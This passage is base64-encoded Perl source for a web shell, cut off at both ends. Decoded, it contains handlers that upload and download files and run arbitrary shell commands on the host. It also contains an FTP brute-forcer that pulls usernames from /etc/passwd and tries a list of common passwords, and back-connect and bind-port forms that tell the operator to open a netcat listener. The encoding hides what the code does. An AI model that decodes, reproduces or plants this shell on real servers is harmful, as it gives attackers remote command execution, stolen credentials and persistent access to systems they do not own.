zsNCgkJJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsNCgl9DQoNCglpZigkT3B0aW9ucyBlcSAiZ28iKSAjIHdlIGhhdmUgdG8gc2VuZCB0aGUgZmlsZQ0KCXsNCgkJJlNlbmRGaWxlVG9Ccm93c2VyKCRUYXJnZXRGaWxlKTsNCgl9DQoJZWxzZSAjIHdlIGhhdmUgdG8gc2VuZCBvbmx5IHRoZSBsaW5rIHBhZ2UNCgl7DQoJCSZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOw0KCX0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB1c2VyIHdhbnRzIHRvIHVwbG9hZCBhIGZpbGUuIElmIHRoZQ0KIyBmaWxlIGlzIG5vdCBzcGVjaWZpZWQsIGl0IGRpc3BsYXlzIGEgZm9ybSBhbGxvd2luZyB0aGUgdXNlciB0byBzcGVjaWZ5IGENCiMgZmlsZSwgb3RoZXJ3aXNlIGl0IHN0YXJ0cyB0aGUgdXBsb2FkIHByb2Nlc3MuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgVXBsb2FkRmlsZQ0Kew0KCSMgaWYgbm8gZmlsZSBpcyBzcGVjaWZpZWQsIHByaW50IHRoZSB1cGxvYWQgZm9ybSBhZ2Fpbg0KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpDQoJew0KCQlyZXR1cm4gJlByaW50RmlsZVVwbG9hZEZvcm07DQoNCgl9DQoJbXkgJHJlc3VsdD0iIjsNCgkjIHN0YXJ0IHRoZSB1cGxvYWRpbmcgcHJvY2Vzcw0KCSRyZXN1bHQgLj0gIlVwbG9hZGluZyAkVHJhbnNmZXJGaWxlIHRvICRDdXJyZW50RGlyLi4uPGJyPiI7DQoNCgkjIGdldCB0aGUgZnVsbGx5IHF1YWxpZmllZCBwYXRobmFtZSBvZiB0aGUgZmlsZSB0byBiZSBjcmVhdGVkDQoJY2hvcCgkVGFyZ2V0TmFtZSkgaWYgKCRUYXJnZXROYW1lID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87DQoJJFRyYW5zZmVyRmlsZSA9fiBtIShbXi9eXFxdKikkITsNCgkkVGFyZ2V0TmFtZSAuPSAkUGF0aFNlcC4kMTsNCg0KCSRUYXJnZXRGaWxlU2l6ZSA9IGxlbmd0aCgkaW57J2ZpbGVkYXRhJ30pOw0KCSMgaWYgdGhlIGZpbGUgZXhpc3RzIGFuZCB3ZSBhcmUgbm90IHN1cHBvc2VkIHRvIG92ZXJ3cml0ZSBpdA0KCWlmKC1lICRUYXJnZXROYW1lICYmICRPcHRpb25zIG5lICJvdmVyd3JpdGUiKQ0KCXsNCgkJJHJlc3VsdCAuPSAiRmFpbGVkOiBEZXN0aW5hdGlvbiBmaWxlIGFscmVhZHkgZXhpc3RzLjxicj4iOw0KCX0NCgllbHNlICMgZmlsZSBpcyBub3QgcHJlc2VudA0KCXsNCgkJaWYob3BlbihVUExPQURGSUxFLCAiPiRUYXJnZXROYW1lIikpDQoJCXsNCgkJCWJpbm1vZGUoVVBMT0FERklMRSkgaWYgJFdpbk5UOw0KCQkJcHJpbnQgVVBMT0FERklMRSAkaW57J2ZpbGVkYXRhJ307DQoJCQljbG9zZShVUExPQURGSUxFKTsNCgkJCSRyZXN1bHQgLj0gIlRyYW5zZmVyZWQgJFRhcmdldEZpbGVTaXplIEJ5dGVzLjxicj4iOw0KCQkJJHJlc3VsdCAuPSAiRmlsZSBQYXRoOiAkVGFyZ2V0TmFtZTxicj4iOw0KCQl9DQoJCWVsc2UNCgkJew0KCQkJJHJlc3VsdCAuPSAiRmFpbGVkOiAkITxicj4iOw0KCQl9DQoJfQ0KCSRyZXN1bHQgLj0gJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciB3YW50cyB0byBkb3dubG9hZCBhIGZpbGUuIElmIHRoZQ0KIyBmaWxlbmFtZSBpcyBub3Qgc3BlY2lmaWVkLCBpdCBkaXNwbGF5cyBhIGZvcm0gYWxsb3dpbmcgdGhlIHVzZXIgdG8gc3BlY2lmeSBhDQojIGZpbGUsIG90aGVyd2lzZSBpdCBkaXNwbGF5cyBhIG1lc3NhZ2UgdG8gdGhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluaw0KIyB0aHJvdWdoICB3aGljaCB0aGUgZmlsZSBjYW4gYmUgZG93bmxvYWRlZC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBEb3dubG9hZEZpbGUNCnsNCgkjIGlmIG5vIGZpbGUgaXMgc3BlY2lmaWVkLCBwcmludCB0aGUgZG93bmxvYWQgZm9ybSBhZ2Fpbg0KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpDQoJew0KCQkmUHJpbnRQYWdlSGVhZGVyKCJmIik7DQoJCXJldHVybiAmUHJpbnRGaWxlRG93bmxvYWRGb3JtOw0KCX0NCgkNCgkjIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkDQoJaWYoKCRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlxcfF4uOi8pKSB8ICghJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXC8vKSkpICMgcGF0aCBpcyBhYnNvbHV0ZQ0KCXsNCgkJJFRhcmdldEZpbGUgPSAkVHJhbnNmZXJGaWxlOw0KCX0NCgllbHNlICMgcGF0aCBpcyByZWxhdGl2ZQ0KCXsNCgkJY2hvcCgkVGFyZ2V0RmlsZSkgaWYoJFRhcmdldEZpbGUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsNCgkJJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsNCgl9DQoNCglpZigkT3B0aW9ucyBlcSAiZ28iKSAjIHdlIGhhdmUgdG8gc2VuZCB0aGUgZmlsZQ0KCXsNCgkJcmV0dXJuICZTZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7DQoJfQ0KCWVsc2UgIyB3ZSBoYXZlIHRvIHNlbmQgb25seSB0aGUgbGluayBwYWdlDQoJew0KCQlyZXR1cm4gJlByaW50RG93bmxvYWRMaW5rUGFnZSgkVGFyZ2V0RmlsZSk7DQoJfQ0KfQ0KDQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgdG8gZXhlY3V0ZSBjb21tYW5kcy4gSXQgZGlzcGxheXMgdGhlIG91dHB1dCBvZiB0aGUNCiMgY29tbWFuZCBhbmQgYWxsb3dzIHRoZSB1c2VyIHRvIGVudGVyIGFub3RoZXIgY29tbWFuZC4gVGhlIGNoYW5nZSBkaXJlY3RvcnkNCiMgY29tbWFuZCBpcyBoYW5kbGVkIGRpZmZlcmVudGx5LiBJbiB0aGlzIGNhc2UsIHRoZSBuZXcgZGlyZWN0b3J5IGlzIHN0b3JlZCBpbg0KIyBhbiBpbnRlcm5hbCB2YXJpYWJsZSBhbmQgaXMgdXNlZCBlYWNoIHRpbWUgYSBjb21tYW5kIGhhcyB0byBiZSBleGVjdXRlZC4gVGhlDQojIG91dHB1dCBvZiB0aGUgY2hhbmdlIGRpcmVjdG9yeSBjb21tYW5kIGlzIG5vdCBkaXNwbGF5ZWQgdG8gdGhlIHVzZXJzDQojIHRoZXJlZm9yZSBlcnJvciBtZXNzYWdlcyBjYW5ub3QgYmUgZGlzcGxheWVkLg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEV4ZWN1dGVDb21tYW5kDQp7DQoJbXkgJHJlc3VsdD0iIjsNCglpZigkUnVuQ29tbWFuZCA9fiBtL15ccypjZFxzKyguKykvKSAjIGl0IGlzIGEgY2hhbmdlIGRpciBjb21tYW5kDQoJew0KCQkjIHdlIGNoYW5nZSB0aGUgZGlyZWN0b3J5IGludGVybmFsbHkuIFRoZSBvdXRwdXQgb2YgdGhlDQoJCSMgY29tbWFuZCBpcyBub3QgZGlzcGxheWVkLg0KCQkkQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuImNkICQxIi4kQ21kU2VwLiRDbWRQd2Q7DQoJCWNob3AoJEN1cnJlbnREaXIgPSBgJENvbW1hbmRgKTsNCgkJJHJlc3VsdCAuPSAmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCg0KCQkkcmVzdWx0IC49ICJDb21tYW5kOiA8cnVuPiRSdW5Db21tYW5kIDwvcnVuPjxicj48dGV4dGFyZWEgY29scz0nJGNvbHMnIHJvd3M9JyRyb3dzJyBzcGVsbGNoZWNrPSdmYWxzZSc+IjsNCgkJIyB4dWF0IHRob25nIHRpbiBraGkgY2h1eWVuIGRlbiAxIHRodSBtdWMgbmFvIGRvIQ0KCQkkUnVuQ29tbWFuZD0gJFdpbk5UPyJkaXIiOiJkaXIgLWxpYSI7DQoJCSRyZXN1bHQgLj0gJlJ1bkNtZDsNCgl9ZWxzaWYoJFJ1bkNvbW1hbmQgPX4gbS9eXHMqZWRpdFxzKyguKykvKQ0KCXsNCgkJJHJlc3VsdCAuPSAgJlNhdmVGaWxlRm9ybTsNCgl9ZWxzZQ0KCXsNCgkJJHJlc3VsdCAuPSAmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCgkJJHJlc3VsdCAuPSAiQ29tbWFuZDogPHJ1bj4kUnVuQ29tbWFuZDwvcnVuPjxicj48dGV4dGFyZWEgaWQ9J2RhdGEnIGNvbHM9JyRjb2xzJyByb3dzPSckcm93cycgc3BlbGxjaGVjaz0nZmFsc2UnPiI7DQoJCSRyZXN1bHQgLj0mUnVuQ21kOw0KCX0NCgkkcmVzdWx0IC49ICAiPC90ZXh0YXJlYT4iOw0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIHJ1biBjb21tYW5kDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCnN1YiBSdW5DbWQNCnsNCglteSAkcmVzdWx0PSIiOw0KCSRDb21tYW5kID0gImNkIFwiJEN1cnJlbnREaXJcIiIuJENtZFNlcC4kUnVuQ29tbWFuZC4kUmVkaXJlY3RvcjsNCglpZighJFdpbk5UKQ0KCXsNCgkJJFNJR3snQUxSTSd9ID0gXCZDb21tYW5kVGltZW91dDsNCgkJYWxhcm0oJENvbW1hbmRUaW1lb3V0RHVyYXRpb24pOw0KCX0NCglpZigkU2hvd0R5bmFtaWNPdXRwdXQpICMgc2hvdyBvdXRwdXQgYXMgaXQgaXMgZ2VuZXJhdGVkDQoJew0KCQkkfD0xOw0KCQkkQ29tbWFuZCAuPSAiIHwiOw0KCQlvcGVuKENvbW1hbmRPdXRwdXQsICRDb21tYW5kKTsNCgkJd2hpbGUoPENvbW1hbmRPdXRwdXQ+KQ0KCQl7DQoJCQkkXyA9fiBzLyhcbnxcclxuKSQvLzsNCgkJCSRyZXN1bHQgLj0gJkh0bWxTcGVjaWFsQ2hhcnMoIiRfXG4iKTsNCgkJfQ0KCQkkfD0wOw0KCX0NCgllbHNlICMgc2hvdyBvdXRwdXQgYWZ0ZXIgY29tbWFuZCBjb21wbGV0ZXMNCgl7DQoJCSRyZXN1bHQgLj0gJkh0bWxTcGVjaWFsQ2hhcnMoJyRDb21tYW5kJyk7DQoJfQ0KCWlmKCEkV2luTlQpDQoJew0KCQlhbGFybSgwKTsNCgl9DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQojIEZvcm0gU2F2ZSBGaWxlIA0KIz09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0Kc3ViIFNhdmVGaWxlRm9ybQ0Kew0KCW15ICRyZXN1bHQgPSIiOw0KCXN1YnN0cigkUnVuQ29tbWFuZCwwLDUpPSIiOw0KCW15ICRmaWxlPSZ0cmltKCRSdW5Db21tYW5kKTsNCgkkc2F2ZT0nPGJyPjxpbnB1dCBuYW1lPSJhIiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJzYXZlIiBjbGFzcz0ic3VibWl0IiA+JzsNCgkkRmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4kUnVuQ29tbWFuZDsNCglteSAkZGlyPSI8c3BhbiBzdHlsZT0nZm9udDogMTFwdCBWZXJkYW5hOyBmb250LXdlaWdodDogYm9sZDsnPiIuJkFkZExpbmtEaXIoImd1aSIpLiI8L3NwYW4+IjsNCglpZigtdyAkRmlsZSkNCgl7DQoJCSRyb3dzPSIyMyINCgl9ZWxzZQ0KCXsNCgkJJG1zZz0iPGJyPjxmb250IHN0eWxlPSdmb250OiAxNXB0IFZlcmRhbmE7IGNvbG9yOiB5ZWxsb3c7JyA+IFBlcm1pc3Npb24gZGVuaWVkITxmb250Pjxicj4iOw0KCQkkcm93cz0iMjAiDQoJfQ0KCSRQcm9tcHQgPSAkV2luTlQgPyAiJGRpciA+ICIgOiAiPGZvbnQgY29sb3I9JyNGRkZGRkYnPlthZG1pblxAJFNlcnZlck5hbWUgJGRpcl1cJDwvZm9udD4gIjsNCgkkcmVhZD0oJFdpbk5UKT8idHlwZSI6Imxlc3MiOw0KCSRSdW5Db21tYW5kID0gIiRyZWFkIFwiJFJ1bkNvbW1hbmRcIiI7DQoJJHJlc3VsdCAuPSAgPDxFTkQ7DQoJPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQoNCgk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPg0KCSRQcm9tcHQNCgk8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iNDAiIG5hbWU9ImMiPg0KCTxpbnB1dCBuYW1lPSJzIiBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJFbnRlciI+DQoJPGJyPkNvbW1hbmQ6IDxydW4+ICRSdW5Db21tYW5kIDwvcnVuPg0KCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImZpbGUiIHZhbHVlPSIkZmlsZSIgPiAkc2F2ZSA8YnI+ICRtc2cNCgk8YnI+PHRleHRhcmVhIGlkPSJkYXRhIiBuYW1lPSJkYXRhIiBjb2xzPSIkY29scyIgcm93cz0iJHJvd3MiIHNwZWxsY2hlY2s9ImZhbHNlIj4NCkVORA0KCQ0KCSRyZXN1bHQgLj0gJlJ1bkNtZDsNCgkkcmVzdWx0IC49ICAiPC90ZXh0YXJlYT4iOw0KCSRyZXN1bHQgLj0gICI8L2Zvcm0+IjsNCglyZXR1cm4gJHJlc3VsdDsNCn0NCiM9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCiMgU2F2ZSBGaWxlDQojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQpzdWIgU2F2ZUZpbGUoJCkNCnsNCglteSAkRGF0YT0gc2hpZnQgOw0KCW15ICRGaWxlPSBzaGlmdDsNCgkkRmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4kRmlsZTsNCglpZihvcGVuKEZJTEUsICI+JEZpbGUiKSkNCgl7DQoJCWJpbm1vZGUgRklMRTsNCgkJcHJpbnQgRklMRSAkRGF0YTsNCgkJY2xvc2UgRklMRTsNCgkJcmV0dXJuIDE7DQoJfWVsc2UNCgl7DQoJCXJldHVybiAwOw0KCX0NCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgQnJ1dGUgRm9yY2VyIEZvcm0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBCcnV0ZUZvcmNlckZvcm0NCnsNCglteSAkcmVzdWx0PSIiOw0KCSRyZXN1bHQgLj0gPDxFTkQ7DQoNCjx0YWJsZT4NCg0KPHRyPg0KPHRkIGNvbHNwYW49IjIiIGFsaWduPSJjZW50ZXIiPg0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjPGJyPg0KU2ltcGxlIEZUUCBicnV0ZSBmb3JjZXI8YnI+DQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KDQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iYnJ1dGVmb3JjZXIiLz4NCjwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkPlVzZXI6PGJyPjx0ZXh0YXJlYSByb3dzPSIxOCIgY29scz0iMzAiIG5hbWU9InVzZXIiPg0KRU5EDQpjaG9wKCRyZXN1bHQgLj0gYGxlc3MgL2V0Yy9wYXNzd2QgfCBjdXQgLWQ6IC1mMWApOw0KJHJlc3VsdCAuPSA8PCdFTkQnOw0KPC90ZXh0YXJlYT48L3RkPg0KPHRkPg0KDQpQYXNzOjxicj4NCjx0ZXh0YXJlYSByb3dzPSIxOCIgY29scz0iMzAiIG5hbWU9InBhc3MiPjEyM3Bhc3MNCjEyMyFAIw0KMTIzYWRtaW4NCjEyM2FiYw0KMTIzNDU2YWRtaW4NCjEyMzQ1NTQzMjENCjEyMzQ0MzIxDQpwYXNzMTIzDQphZG1pbg0KYWRtaW5jcA0KYWRtaW5pc3RyYXRvcg0KbWF0a2hhdQ0KcGFzc2FkbWluDQpwQHNzd29yZA0KcEBzc3cwcmQNCnBhc3N3b3JkDQoxMjM0NTYNCjEyMzQ1NjcNCjEyMzQ1Njc4DQoxMjM0NTY3ODkNCjEyMzQ1Njc4OTANCjExMTExMQ0KMDAwMDAwDQoyMjIyMjINCjMzMzMzMw0KNDQ0NDQ0DQo1NTU1NTUNCjY2NjY2Ng0KNzc3Nzc3DQo4ODg4ODgNCjk5OTk5OQ0KMTIzMTIzDQoyMzQyMzQNCjM0NTM0NQ0KNDU2NDU2DQo1Njc1NjcNCjY3ODY3OA0KNzg5Nzg5DQoxMjMzMjENCjQ1NjY1NA0KNjU0MzIxDQo3NjU0MzIxDQo4NzY1NDMyMQ0KOTg3NjU0MzIxDQowOTg3NjU0MzIxDQphZG1pbjEyMw0KYWRtaW4xMjM0NTYNCmFiY2RlZg0KYWJjYWJjDQohQCMhQCMNCiFAIyQlXg0KIUAjJCVeJiooDQohQCMkJCNAIQ0KYWJjMTIzDQphbmh5ZXVlbQ0KaWxvdmV5b3U8L3RleHRhcmVhPg0KPC90ZD4NCjwvdHI+DQo8dHI+DQo8dGQgY29sc3Bhbj0iMiIgYWxpZ249ImNlbnRlciI+DQpTbGVlcDo8c2VsZWN0IG5hbWU9InNsZWVwIj4NCg0KPG9wdGlvbj4wPC9vcHRpb24+DQo8b3B0aW9uPjE8L29wdGlvbj4NCjxvcHRpb24+Mjwvb3B0aW9uPg0KDQo8b3B0aW9uPjM8L29wdGlvbj4NCjwvc2VsZWN0PiANCjxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJzdWJtaXQiIHZhbHVlPSJCcnV0ZSBGb3JjZXIiLz48L3RkPjwvdHI+DQo8L2Zvcm0+DQo8L3RhYmxlPg0KRU5EDQpyZXR1cm4gJHJlc3VsdDsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgQnJ1dGUgRm9yY2VyDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQnJ1dGVGb3JjZXINCnsNCglteSAkcmVzdWx0PSIiOw0KCSRTZXJ2ZXI9JEVOVnsnU0VSVkVSX0FERFInfTsNCglpZigkaW57J3VzZXInfSBlcSAiIikNCgl7DQoJCSRyZXN1bHQgLj0gJkJydXRlRm9yY2VyRm9ybTsNCgl9ZWxzZQ0KCXsNCgkJdXNlIE5ldDo6RlRQOyANCgkJQHVzZXI9IHNwbGl0KC9cbi8sICRpbnsndXNlcid9KTsNCgkJQHBhc3M9IHNwbGl0KC9cbi8sICRpbnsncGFzcyd9KTsNCgkJY2hvbXAoQHVzZXIpOw0KCQljaG9tcChAcGFzcyk7DQoJCSRyZXN1bHQgLj0gIjxicj48YnI+WytdIFRyeWluZyBicnV0ZSAkU2VydmVyTmFtZTxicj49PT09PT09PT09PT09PT09PT09PT4+Pj4+Pj4+Pj4+Pjw8PDw8PDw8PDw9PT09PT09PT09PT09PT09PT09PTxicj48YnI+XG4iOw0KCQlmb3JlYWNoICR1c2VybmFtZSAoQHVzZXIpDQoJCXsNCgkJCWlmKCEoJHVzZXJuYW1lIGVxICIiKSkNCgkJCXsNCgkJCQlmb3JlYWNoICRwYXNzd29yZCAoQHBhc3MpDQoJCQkJew0KCQkJCQkkZnRwID0gTmV0OjpGVFAtPm5ldygkU2VydmVyKSBvciBkaWUgIkNvdWxkIG5vdCBjb25uZWN0IHRvICRTZXJ2ZXJOYW1lXG4iOyANCgkJCQkJaWYoJGZ0cC0+bG9naW4oIiR1c2VybmFtZSIsIiRwYXNzd29yZCIpKQ0KCQkJCQl7DQoJCQkJCQkkcmVzdWx0IC49ICI8YSB0YXJnZXQ9J19ibGFuaycgaHJlZj0nZnRwOi8vJHVzZXJuYW1lOiRwYXNzd29yZFxAJFNlcnZlcic+WytdIGZ0cDovLyR1c2VybmFtZTokcGFzc3dvcmRcQCRTZXJ2ZXI8L2E+PGJyPlxuIjsNCgkJCQkJCSRmdHAtPnF1aXQoKTsNCgkJCQkJCWJyZWFrOw0KCQkJCQl9DQoJCQkJCWlmKCEoJGlueydzbGVlcCd9IGVxICIwIikpDQoJCQkJCXsNCgkJCQkJCXNsZWVwKGludCgkaW57J3NsZWVwJ30pKTsNCgkJCQkJfQ0KCQkJCQkkZnRwLT5xdWl0KCk7DQoJCQkJfQ0KCQkJfQ0KCQl9DQoJCSRyZXN1bHQgLj0gIlxuPGJyPj09PT09PT09PT0+Pj4+Pj4+Pj4+IEZpbmlzaGVkIDw8PDw8PDw8PDw9PT09PT09PT09PGJyPlxuIjsNCgl9DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIEJhY2tjb25uZWN0IEZvcm0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBCYWNrQmluZEZvcm0NCnsNCglyZXR1cm4gPDxFTkQ7DQoJPGJyPjxicj4NCg0KCTx0YWJsZT4NCgk8dHI+DQoJPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQoJPHRkPkJhY2tDb25uZWN0OiA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iYmFja2JpbmQiPjwvdGQ+DQoJPHRkPiBIb3N0OiA8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iMjAiIG5hbWU9ImNsaWVudGFkZHIiIHZhbHVlPSIkRU5WeydSRU1PVEVfQUREUid9Ij4NCgkgUG9ydDogPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjciIG5hbWU9ImNsaWVudHBvcnQiIHZhbHVlPSI4MCIgb25rZXl1cD0iZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2JhJykuaW5uZXJIVE1MPXRoaXMudmFsdWU7Ij48L3RkPg0KDQoJPHRkPjxpbnB1dCBuYW1lPSJzIiBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIG5hbWU9InN1Ym1pdCIgdmFsdWU9IkNvbm5lY3QiPjwvdGQ+DQoJPC9mb3JtPg0KCTwvdHI+DQoJPHRyPg0KCTx0ZCBjb2xzcGFuPTM+PGZvbnQgY29sb3I9I0ZGRkZGRj5bK10gQ2xpZW50IGxpc3RlbiBiZWZvcmUgY29ubmVjdCBiYWNrIQ0KCTxicj5bK10gVHJ5IGNoZWNrIHlvdXIgUG9ydCB3aXRoIDxhIHRhcmdldD0iX2JsYW5rIiBocmVmPSJodHRwOi8vd3d3LmNhbnlvdXNlZW1lLm9yZy8iPmh0dHA6Ly93d3cuY2FueW91c2VlbWUub3JnLzwvYT4NCgk8YnI+WytdIENsaWVudCBsaXN0ZW4gd2l0aCBjb21tYW5kOiA8cnVuPm5jIC12diAtbCAtcCA8c3BhbiBpZD0iYmEiPjgwPC9zcGFuPjwvcnVuPjwvZm9udD48L3RkPg0KDQoJPC90cj4NCgk8L3RhYmxlPg0KDQoJPGJyPjxicj4NCgk8dGFibGU+DQoJPHRyPg0KCTxmb3JtIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KCTx0ZD5CaW5kIFBvcnQ6IDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJiYWNrYmluZCI+PC90ZD4NCg0KCTx0ZD4gUG9ydDogPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjE1IiBuYW1lPSJjbGllbnRwb3J0IiB2YWx1ZT0iMTQxMiIgb25rZXl1cD0iZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2JpJykuaW5uZXJIVE1MPXRoaXMudmFsdWU7Ij4NCg0KCSBQYXNzd29yZDogPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjE1IiBuYW1lPSJiaW5kcGFzcyIgdmFsdWU9IlRISUVVR0lBQlVPTiI+PC90ZD4NCgk8dGQ+PGlucHV0IG5hbWU9InMiIGNsYXNzPSJzdWJtaXQiIHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0IiB2YWx1ZT0iQmluZCI+PC90ZD4NCgk8L2Zvcm0+DQoJPC90cj4NCgk8dHI+DQoJPHRkIGNvbHNwYW49Mz48Zm9udCBjb2xvcj0jRkZGRkZGPlsrXSBDaHVjIG5hbmcgY2h1YSBkYyB0ZXN0IQ0KCTxicj5bK10gVHJ5IGNvbW1hbmQ6IDxydW4+bmMgJEVOVnsnU0VSVkVSX0FERFInfSA8c3BhbiBpZD0iYmkiPjE0MTI8L3NwYW4+PC9ydW4+PC9mb250PjwvdGQ+DQoNCgk8L3RyPg0KCTwvdGFibGU+PGJyPg0KRU5EDQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIEJhY2tjb25uZWN0IHVzZSBwZXJsDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQmFja0JpbmQNCnsNCgl1c2UgTUlNRTo6QmFzZTY0Ow0KCXVzZSB